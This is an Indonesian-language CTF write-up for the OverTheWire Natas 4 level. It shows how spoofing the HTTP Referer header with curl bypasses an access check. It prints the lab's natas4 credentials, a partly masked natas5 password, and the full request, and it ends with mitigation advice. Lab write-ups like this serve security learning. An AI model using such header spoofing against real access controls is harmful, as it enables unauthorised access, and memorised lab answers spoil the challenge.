# Natas 04 → Natas 05

## 🎯 Objective

Mendapatkan password untuk level Natas 05.

## 🔎 Initial Analysis

Aplikasi memberikan pesan bahwa akses hanya diperbolehkan apabila request berasal dari lokasi/halaman tertentu, dan dalam kasus ini lokasi/halaman yang ditentukan adalah http://natas5.natas.labs.overthewire.org

Saya kemudian memeriksa bagaimana server menentukan asal request tersebut.

## 🧠 Vulnerability / Concept

**Concept:** HTTP Referer manipulation

HTTP request dapat memiliki header:

```http
Referer: [http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)

```
## 🧪 Investigation
Percobaan:

Request awal (Browser Default):

HTTP
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro
Referer: [http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)

Response (Awal):

Access disallowed. You are visiting from "[http://natas4.natas.labs.overthewire.org/](http://natas4.natas.labs.overthewire.org/)" while authorized users should come only from "[http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)"

Request setelah perubahan (Menggunakan cURL):

Bash
curl -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth \
     -H "Referer: [http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)" \
     [http://natas4.natas.labs.overthewire.org/index.php](http://natas4.natas.labs.overthewire.org/index.php)

Penjelasan perintah:

-u : Mengirimkan username dan password untuk otentikasi (Basic Auth).

-H : Memaksa pengiriman header HTTP kustom (dalam hal ini, Referer).

Hasil Yang diterima : Access granted. The password for natas5 is e4z2Noy3oqwPJUW..............

## 🛡️ Mitigation

Header Referer tidak boleh digunakan sebagai mekanisme autentikasi atau authorization.

Gunakan session, authentication, dan authorization server-side yang valid.

## 📚 Yang Saya Pelajari

1. Struktur HTTP request.

2. Fungsi HTTP headers.

3. Referer dapat dikontrol sepenuhnya oleh client.

## Tools Yang Saya Gunakan

cURL (Command Line)